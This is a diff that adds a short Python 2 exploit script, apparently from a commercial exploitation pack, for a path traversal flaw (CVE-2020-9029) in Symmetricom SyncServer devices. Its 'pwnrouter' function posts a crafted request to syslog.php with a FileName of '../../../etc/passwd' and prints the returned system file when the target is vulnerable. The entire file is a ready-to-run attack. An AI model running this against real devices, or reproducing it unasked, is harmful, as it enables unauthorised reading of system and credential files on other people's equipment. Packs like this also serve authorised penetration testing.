@@ -1,0 +1,44 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_symmetricom_1'
+_vendor_ = 'symmetricom'
+_model_  = ['S100', 'S200', 'S250', 'S300', 'S350']
+_vuln_   = 'Path Traversal Vulnerability'
+_cve_    = 'CVE-2020-9029'
+_ref_    = 'https://sku11army.blogspot.com/2020/01/symmetricom-syncserver.html'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/controller/syslog.php' % (host,port)
+    headers = {u"Content-Type": u"application/x-www-form-urlencoded"}
+    params = 'currentTab=syslog&refreshMode=&postMode=saveas&Messages=%0D%0A&FileName=../../../etc/passwd'      
+    response = requests.post(url, data=params, headers=headers, allow_redirects=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if 'root:x' in response.text:
+    print '[+] %s vulnerable\n' % host
+    print response.text
+  else:
+    print '[+] %s not vulnerable' % host
+    print response.text
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
